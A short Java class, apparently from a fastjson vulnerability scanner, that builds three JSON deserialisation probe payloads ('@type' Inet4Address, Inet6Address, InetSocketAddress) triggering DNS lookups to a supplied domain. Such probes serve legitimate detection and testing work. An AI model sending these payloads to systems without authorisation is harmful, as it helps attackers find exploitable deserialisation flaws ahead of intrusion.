package com.ding0x0.fastjson;

import com.ding0x0.Payload;

public class DNSPayload implements Payload {
    public String template = "[+] {\"@type\":\"java.net.Inet4Address\",\"val\":\"%s\"}\n" +
            "[+] {\"@type\":\"java.net.Inet6Address\",\"val\":\"%s\"}\n" +
            "[+] {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"%s\"}}";

    public String dns;

    public DNSPayload(String dns){
        this.dns = dns;
    }

    public String format(){
        return this.template.replaceAll("%s",this.dns);
    }
}
